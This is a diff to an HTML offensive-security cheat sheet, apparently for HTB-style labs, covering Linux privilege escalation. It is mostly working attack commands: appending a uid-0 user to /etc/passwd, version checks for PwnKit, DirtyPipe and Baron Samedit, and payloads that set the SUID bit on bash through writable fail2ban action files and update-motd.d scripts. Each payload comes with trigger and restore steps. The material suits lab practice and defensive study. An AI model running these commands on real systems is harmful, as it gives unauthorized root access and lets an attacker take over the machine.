 <div class="cmd-wrap"><div class="cmd-label">Two-step if openssl isn't available</div>
-<pre class="cmd"># Step 1: generate hash on Kali:
-python3 -c "import crypt; print(crypt.crypt('Password123', crypt.mksalt(crypt.METHOD_SHA512)))"
-# Step 2: append on target:
+<pre class="cmd"># Generate SHA-512 hash on Kali (python3 crypt removed in 3.13 — use openssl):
+openssl passwd -6 Password123
+# Or with Python on older systems:
+python3 -c "import crypt; print(crypt.crypt('Password123', crypt.mksalt(crypt.METHOD_SHA512)))" 2>/dev/null \
+  || openssl passwd -6 Password123
+# Append on target:
 echo 'newroot:PASTE_HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd
 su newroot</pre></div>
 </div>
@@ -3522,12 +3694,18 @@ uname -a — x86_64 = 64-bit | i686/i386 = 32-bit. Run the matching exploit bina
 <div class="cmd-wrap"><div class="cmd-label">Get kernel version for lookup</div>
 <pre class="cmd">uname -r && cat /etc/os-release</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Pure bash: check the three most reliable kernel privesc paths without any external tool</div>
-<pre class="cmd"># 1. PwnKit (CVE-2021-4034) — pkexec SUID present + version < 0.120?
+<pre class="cmd"># 1. PwnKit (CVE-2021-4034) — pkexec SUID present? Check polkit package version (NOT just pkexec --version)
 ls -la /usr/bin/pkexec 2>/dev/null && pkexec --version 2>/dev/null
-# Present + version <= 0.119 = likely vulnerable
+# WARNING: distros backport fixes without bumping version. Check the PACKAGE version:
+dpkg -l policykit-1 2>/dev/null | awk '/policykit/{print $2,$3}'  # Debian/Ubuntu
+rpm -q polkit 2>/dev/null  # RHEL/CentOS
+# Ubuntu 20.04 patched at: 0.105-26ubuntu1.2 | Ubuntu 18.04: 0.105-20ubuntu0.18.04.6
 
 # 2. DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
-uname -r | awk -F'[.-]' '{v=$1"."$2"."$3; if(v>="5.8.0" && v<="5.16.11") print "DIRTYPIPE RANGE: " v " — check build date"}'
+# NOTE: numeric comparison required — string compare gives wrong results for 5.10.x vs 5.8.x
+uname -r | awk -F'[.-]' '{maj=$1+0; min=$2+0; patch=$3+0;
+  if (maj==5 && (min>8 || (min==8 && patch>=0)) && (min<16 || (min==16 && patch<=11)))
+    print "DIRTYPIPE RANGE: " maj"."min"."patch" — VULNERABLE"}'
 
 # 3. Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
 sudo --version 2>/dev/null | head -1</pre></div>
@@ -3542,12 +3720,13 @@ sudo --version 2>/dev/null | head -1</pre></div>
 <thead><tr><th>CVE</th><th>Name</th><th>Kernel Versions</th><th>Notes</th></tr></thead>
 <tbody>
 <tr><td><code>CVE-2022-0847</code></td><td class="impact-crit">DirtyPipe</td><td>5.8 - 5.16.11</td><td>Overwrite read-only files. Very reliable. Ubuntu 20.04+</td></tr>
-<tr><td><code>CVE-2021-4034</code></td><td class="impact-crit">PwnKit (pkexec)</td><td>Almost universal (4.4-5.8)</td><td>pkexec SUID vuln. Most reliable. Try it early.</td></tr>
+<tr><td><code>CVE-2021-4034</code></td><td class="impact-crit">PwnKit (pkexec)</td><td>All kernels — polkit &lt; 0.120</td><td>pkexec userspace vuln (NOT kernel). Distros backport fixes — check package version, not just pkexec --version.</td></tr>
 <tr><td><code>CVE-2021-3156</code></td><td class="impact-crit">Baron Samedit (sudo)</td><td>sudo &lt; 1.9.5p2</td><td>Sudo vuln not kernel. sudoedit -s / to check.</td></tr>
-<tr><td><code>CVE-2016-5195</code></td><td class="impact-crit">DirtyCow</td><td>&lt;= 3.19.0-73.8</td><td>Most famous. Many variants. For older kernels. ⚠️ RESTORE /etc/passwd IMMEDIATELY after exploit or machine is unrecoverable!</td></tr>
+<tr><td><code>CVE-2016-5195</code></td><td class="impact-crit">DirtyCow</td><td>2.6.22 – 4.8.3 (also 4.4.x &lt; 4.4.26, 4.7.x &lt; 4.7.9)</td><td>Most famous. Many variants. For older kernels. ⚠️ RESTORE /etc/passwd IMMEDIATELY after exploit or machine is unrecoverable! Do NOT attempt on kernel &gt; 4.8.3.</td></tr>
 <tr><td><code>CVE-2020-14386</code></td><td class="impact-high">OverlayFS Privesc</td><td>4.8 - 5.7</td><td>Ubuntu 18.04-20.04 common</td></tr>
 <tr><td><code>CVE-2019-7304</code></td><td class="impact-high">OverlayFS Race</td><td>4.10 - 4.15</td><td>Ubuntu 16.04</td></tr>
-<tr><td><code>CVE-2021-33034</code></td><td class="impact-high">Kernel Privesc</td><td>5.4 - 5.10.4</td><td></td></tr>
+<tr><td><code>CVE-2021-3560</code></td><td class="impact-crit">Polkit D-Bus Race</td><td>All kernels — polkit 0.113–0.118</td><td>Race condition, different from PwnKit. Ubuntu 20.04/RHEL 8/Fedora 21. Use secnigma PoC.</td></tr>
+<tr><td><code>CVE-2021-33034</code></td><td class="impact-high">Kernel BT UAF</td><td>5.4 - 5.10.4</td><td>Bluetooth HCI use-after-free. Requires Bluetooth hardware — skip if no BT interface.</td></tr>
 <tr><td><code>CVE-2018-8897</code></td><td class="impact-high">Memory Barrier</td><td>3.14 - 4.15</td><td></td></tr>
 <tr><td><code>CVE-2017-8890</code></td><td class="impact-high">Race Condition</td><td>&lt; 4.11.6</td><td></td></tr>
 <tr><td><code>CVE-2016-5696</code></td><td class="impact-high">TCP RCE</td><td>3.6 - 4.7</td><td></td></tr>
@@ -3956,7 +4135,8 @@ done
 # Alternative — show owner/group of each SUID binary to spot group restrictions:
 find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null | awk '{print $1,$3,$4,$NF}'</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check Linux capabilities — same impact as SUID, frequently missed</div>
-<pre class="cmd">getcap -r / 2>/dev/null
+<pre class="cmd">/usr/sbin/getcap -r / 2>/dev/null || getcap -r / 2>/dev/null
+# Full path needed on RHEL/CentOS — /usr/sbin not in $PATH for non-root users
 # Dangerous output to look for: cap_setuid, cap_dac_override, cap_sys_admin
 # Example: /usr/bin/python3 = cap_setuid+ep
 # Exploit cap_setuid immediately:
@@ -4054,7 +4234,8 @@ grep -E "no_root_squash|no_all_squash" /etc/exports 2>/dev/null \
 </div>
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — verify no_root_squash flag</span>
-<div class="cmd-wrap"><pre class="cmd">cat /etc/exports | grep no_root_squash
+<div class="cmd-wrap"><pre class="cmd">grep -v "^#" /etc/exports | grep -E "no_root_squash|no_all_squash"
+# Filter comments first — commented lines give false positives!
 # If output exists → vulnerable</pre></div>
 </div>
 <div class="pipe-step pipe-kali">
@@ -4095,12 +4276,12 @@ rmdir /tmp/nfs</pre></div>
 <section class="section" id="lin-docker">
 <div class="section-header">
   <div><div class="section-num">+</div><div class="section-title">Docker / LXC Group Escape</div>
-  <div class="section-subtitle">docker group = instant root. Check with: id | grep docker</div></div>
+  <div class="section-subtitle">docker group = instant root. Check with: id | grep -w docker</div></div>
   <div class="badges"><span class="badge badge-privesc">PRIVESC</span><span class="badge badge-new">NEW</span></div>
 </div>
 <div class="cmd-wrap"><div class="cmd-label">Detect — group membership</div>
-<pre class="cmd">id | grep docker
-groups | grep docker
+<pre class="cmd">id | grep -w docker && echo "[+] IN docker group"
+groups | tr ' ' '\n' | grep -x docker
 ls -la /var/run/docker.sock 2>/dev/null</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">CRITICAL — verify Docker daemon is actually reachable (group alone is not enough)</div>
 <pre class="cmd">docker ps 2>/dev/null && echo "[+] EXPLOITABLE: Docker daemon accessible"
@@ -4928,6 +5109,95 @@ proxychains evil-winrm -i INTERNAL_IP -u {{USER}} -p {{PASS}}</pre></div>
 </div>
 <div class="notes-toggle" onclick="toggleNotes('lin-chisel')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-chisel" onchange="saveNote('lin-chisel',this.value)" placeholder="Add your notes here..."></textarea>
+</section>
+
+<!-- ── FAIL2BAN ABUSE ─────────────────────────────────────────── -->
+<section class="section" id="lin-fail2ban">
+<div class="section-header">
+  <div><div class="section-num">+</div><div class="section-title">fail2ban Action.d Abuse</div>
+  <div class="section-subtitle">Writable action config + sudo restart = root execution on ban trigger (Trick HTB, PG machines)</div></div>
+  <div class="badges"><span class="badge badge-privesc">PRIVESC</span><span class="badge badge-new">NEW</span></div>
+</div>
+<div class="callout callout-tip"><strong>💡 Often overlooked in sudo -l output.</strong> "sudo /etc/init.d/fail2ban restart" looks harmless — but if action.d is writable, it's instant root on ban trigger. Check it every time.</div>
+
+<div class="pipeline">
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — confirm restart permission AND writable config</span>
+<div class="cmd-wrap"><pre class="cmd">sudo -l 2>/dev/null | grep -E "fail2ban|fail2ban-client"
+# Look for: (root) NOPASSWD: /etc/init.d/fail2ban restart
+# OR: (root) NOPASSWD: /usr/bin/fail2ban-client reload</pre></div>
+<div class="cmd-wrap"><pre class="cmd">find /etc/fail2ban/ -writable -type f 2>/dev/null && echo "[+] WRITABLE fail2ban config found"
+ls -la /etc/fail2ban/action.d/ 2>/dev/null
+stat /etc/fail2ban/action.d/iptables-multiport.conf 2>/dev/null</pre></div>
+</div>
+<div class="pipe-step pipe-backup">
+<span class="pipe-step-label">BACKUP — copy the action file before editing</span>
+<div class="cmd-wrap"><pre class="cmd">cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf.bak</pre></div>
+</div>
+<div class="pipe-step pipe-exploit">
+<span class="pipe-step-label">2. EXPLOIT — inject payload into actionban</span>
+<div class="cmd-wrap"><div class="cmd-label">Replace actionban with SUID bash payload</div>
+<pre class="cmd">sed -i 's|^actionban.*|actionban = chmod +s /bin/bash|' /etc/fail2ban/action.d/iptables-multiport.conf
+# Restart to load new config:
+sudo /etc/init.d/fail2ban restart
+# OR: sudo fail2ban-client reload</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Trigger a ban (brute-force SSH from Kali to fire the actionban)</div>
+<pre class="cmd"># From Kali — trigger fail2ban by sending bad logins:
+for i in $(seq 1 10); do ssh invalid@{{TARGET}} 2>/dev/null; done
+# OR: force a ban manually:
+sudo fail2ban-client set sshd banip {{KALI_IP}}</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Collect shell after ban fires</div>
+<pre class="cmd">bash -p
+id  # uid=0(root)</pre></div>
+</div>
+<div class="pipe-step pipe-restore">
+<span class="pipe-step-label">RESTORE</span>
+<div class="cmd-wrap"><pre class="cmd">cp /tmp/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
+sudo fail2ban-client set sshd unbanip {{KALI_IP}}
+sudo /etc/init.d/fail2ban restart
+chmod -s /bin/bash</pre></div>
+</div>
+</div>
+<div class="notes-toggle" onclick="toggleNotes('lin-fail2ban')">&#128221; Notes</div>
+<textarea class="notes-area" id="notes-lin-fail2ban" onchange="saveNote('lin-fail2ban',this.value)" placeholder="Add your notes here..."></textarea>
+</section>
+
+<!-- ── UPDATE-MOTD.D ABUSE ────────────────────────────────────── -->
+<section class="section" id="lin-motd">
+<div class="section-header">
+  <div><div class="section-num">+</div><div class="section-title">/etc/update-motd.d Writability</div>
+  <div class="section-subtitle">Scripts here execute as root on every SSH login — writable = instant privesc</div></div>
+  <div class="badges"><span class="badge badge-privesc">PRIVESC</span><span class="badge badge-new">NEW</span></div>
+</div>
+<div class="callout callout-warn"><strong>⚠️ Trigger requires SSH login.</strong> The MOTD scripts run when a user SSH-logs in, NOT when you simply run a command in your existing shell. Log OUT and back IN via SSH to trigger.</div>
+
+<div class="pipeline">
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — find writable MOTD scripts</span>
+<div class="cmd-wrap"><pre class="cmd">ls -la /etc/update-motd.d/ 2>/dev/null
+find /etc/update-motd.d/ -writable -type f 2>/dev/null \
+  && echo "[+] EXPLOITABLE: writable MOTD script — fires as root on next SSH login"</pre></div>
+</div>
+<div class="pipe-step pipe-backup">
+<span class="pipe-step-label">BACKUP — save original script</span>
+<div class="cmd-wrap"><pre class="cmd">cp /etc/update-motd.d/00-header /tmp/00-header.bak</pre></div>
+</div>
+<div class="pipe-step pipe-exploit">
+<span class="pipe-step-label">2. EXPLOIT — inject payload and trigger via SSH login</span>
+<div class="cmd-wrap"><pre class="cmd">echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/update-motd.d/00-header
+# Log out and log back in via SSH to trigger (any user):
+# ssh {{USER}}@{{TARGET}}
+/tmp/rootbash -p
+id  # uid=0(root)</pre></div>
+</div>
+<div class="pipe-step pipe-restore">
+<span class="pipe-step-label">RESTORE</span>
+<div class="cmd-wrap"><pre class="cmd">cp /tmp/00-header.bak /etc/update-motd.d/00-header
+rm /tmp/rootbash</pre></div>
+</div>
+</div>
+<div class="notes-toggle" onclick="toggleNotes('lin-motd')">&#128221; Notes</div>
+<textarea class="notes-area" id="notes-lin-motd" onchange="saveNote('lin-motd',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
 
 <!-- ── LINUX DEEP RECON ───────────────────────────────────────── -->
